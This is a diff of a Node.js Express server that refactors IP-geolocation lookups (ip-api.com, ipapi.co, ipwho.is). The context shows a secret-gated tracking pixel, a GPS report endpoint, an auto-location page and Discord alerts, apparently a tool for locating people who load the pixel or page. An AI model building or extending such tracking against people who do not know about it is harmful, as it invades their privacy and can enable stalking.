@@ -2,6 +2,7 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const https = require('https');
+const http = require('http');
 const { createClient } = require('@supabase/supabase-js');
 
 const app = express();
@@ -22,69 +23,61 @@ const PIXEL = Buffer.from(
   'base64'
 );
 
-// IP geolocation with fallback
+function httpGet(url) {
+  return new Promise((resolve) => {
+    const client = url.startsWith('https') ? https : http;
+    client.get(url, (res) => {
+      let data = '';
+      res.on('data', chunk => data += chunk);
+      res.on('end', () => {
+        try { resolve(JSON.parse(data)); }
+        catch (e) { resolve(null); }
+      });
+    }).on('error', () => resolve(null));
+  });
+}
+
 async function lookupIP(ip) {
   if (!ip || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.') || ip === '::1') {
     console.log('Skipping private/local IP:', ip);
     return null;
   }
 
-  // Primary: ipapi.co
+  // Primary: ip-api.com (more reliable free tier)
   try {
-    const result = await new Promise((resolve) => {
-      https.get(`https://ipapi.co/${ip}/json/`, (res) => {
-        let data = '';
-        res.on('data', chunk => data += chunk);
-        res.on('end', () => {
-          try {
-            const json = JSON.parse(data);
-            if (json.latitude && json.longitude) {
-              resolve({ lat: json.latitude, lon: json.longitude, city: json.city, country: json.country_name, source: 'ipapi' });
-            } else {
-              console.log('ipapi.co no coords for', ip, json.error || '');
-              resolve(null);
-            }
-          } catch (e) {
-            console.log('ipapi.co parse error for', ip);
-            resolve(null);
-          }
-        });
-      }).on('error', (err) => {
-        console.log('ipapi.co error for', ip, err.message);
-        resolve(null);
-      });
-    });
-    if (result) return result;
+    const json = await httpGet(`http://ip-api.com/json/${ip}?fields=status,message,lat,lon,city,country`);
+    if (json && json.status === 'success' && json.lat && json.lon) {
+      console.log('ip-api.com success for', ip);
+      return { lat: json.lat, lon: json.lon, city: json.city, country: json.country, source: 'ip-api' };
+    } else {
+      console.log('ip-api.com failed for', ip, json?.message || '');
+    }
+  } catch (e) {
+    console.log('ip-api.com exception:', e.message);
+  }
+
+  // Fallback 1: ipapi.co
+  try {
+    const json = await httpGet(`https://ipapi.co/${ip}/json/`);
+    if (json && json.latitude && json.longitude) {
+      console.log('ipapi.co success for', ip);
+      return { lat: json.latitude, lon: json.longitude, city: json.city, country: json.country_name, source: 'ipapi' };
+    } else {
+      console.log('ipapi.co no coords for', ip);
+    }
   } catch (e) {
     console.log('ipapi.co exception:', e.message);
   }
 
-  // Fallback: ipwho.is
+  // Fallback 2: ipwho.is
   try {
-    const result = await new Promise((resolve) => {
-      https.get(`https://ipwho.is/${ip}`, (res) => {
-        let data = '';
-        res.on('data', chunk => data += chunk);
-        res.on('end', () => {
-          try {
-            const json = JSON.parse(data);
-            if (json.success && json.latitude && json.longitude) {
-              resolve({ lat: json.latitude, lon: json.longitude, city: json.city, country: json.country, source: 'ipwho' });
-            } else {
-              console.log('ipwho.is failed for', ip, json.message || '');
-              resolve(null);
-            }
-          } catch (e) {
-            console.log('ipwho.is parse error for', ip);
-            resolve(null);
-          }
-        });
-      }).on('error', (err) => {
-        console.log('ipwho.is error for', ip, err.message);
-        resolve(null);
-      });
-    });
-    if (result) return result;
+    const json = await httpGet(`https://ipwho.is/${ip}`);
+    if (json && json.success && json.latitude && json.longitude) {
+      console.log('ipwho.is success for', ip);
+      return { lat: json.latitude, lon: json.longitude, city: json.city, country: json.country, source: 'ipwho' };
+    } else {
+      console.log('ipwho.is failed for', ip);
+    }
   } catch (e) {
     console.log('ipwho.is exception:', e.message);
   }
@@ -112,7 +105,6 @@ function sendDiscordNotification(entry) {
   } catch (err) {}
 }
 
-// Tracking pixel
 app.get('/pixel.gif', async (req, res) => {
   if (req.query.t !== SECRET) return res.status(404).end();
 
@@ -148,7 +140,6 @@ app.get('/pixel.gif', async (req, res) => {
   res.send(PIXEL);
 });
 
-// GPS report endpoint
 app.post('/report', async (req, res) => {
   const secret = req.query.t || req.body.t;
   if (secret !== SECRET) return res.status(403).json({ error: 'bad secret' });
@@ -186,7 +177,6 @@ app.get('/api/hits', async (req, res) => {
   }
 });
 
-// Auto location page
 app.get('/locate', (req, res) => {
   const secret = req.query.t || 'test123';
   res.send(`<!DOCTYPE html>
@@ -231,7 +221,6 @@ app.get('/locate', (req, res) => {
 </html>`);
 });
 
-// Map page
 app.get('/map', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html>
